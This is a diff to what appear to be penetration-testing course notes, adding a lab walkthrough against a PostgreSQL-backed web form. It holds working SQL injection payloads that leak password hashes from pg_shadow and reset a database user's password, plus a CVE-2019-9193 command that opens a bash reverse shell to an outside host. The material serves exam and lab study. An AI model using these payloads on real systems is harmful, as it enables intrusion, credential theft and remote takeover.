@@ -689,6 +689,32 @@ find all files with OS{ in them
 find / -type f -name 'flag.txt' -exec grep -i "OS{" {} + 2>/dev/null 1>hello
 ```
 
+10.3.2.6 Steps
+
+1. found sqli on class form
+2. used cast to get values from db via error message
+
+```
+weight=12&height=' and 1=cast((SELECT passwd FROM pg_shadow LIMIT 1 OFFSET 1) as int) and '1'='1' -- //&email=a%40a.com
+
+pg_query(): Query failed: ERROR:  invalid input syntax for type integer: &quot;glovedb&quot; in <b>/var/www/html/class.php</b>
+
+```
+3. got password hash and tried cracking with md5 -- didn't work
+```
+weight=12&height=' and 1=cast((SELECT passwd FROM pg_shadow LIMIT 1 OFFSET 1) as int) and '1'='1' -- //&email=a%40a.com
+```
+4. decided to overwrite user's password instead
+```
+weight=12&height='; alter user rubben with password 'password' -- //&email=a%40a.com
+```
+
+5. used cve-2019-9193.py  (since we're on postgres) with new password. passed in reverse shell command
+
+```
+python3 cve-2019-9193.py -i 192.168.198.49 -d glovedb -U rubben -P password -c bash -c "bash -i >& /dev/tcp/192.168.45.202/4444 0>&1"
+```
+
 ## Client-side attacks
 
 
@@ -875,7 +901,9 @@ example template https://learn.microsoft.com/en-us/windows/win32/shell/library-s
 offsec version
 
 isLibraryPinned -> is library pinned in windows explorer
+
 iconReference -> which icon to use (imageres.dll, -1003 is an img icon)
+
 folderType -> use Documents guid
 
 ```
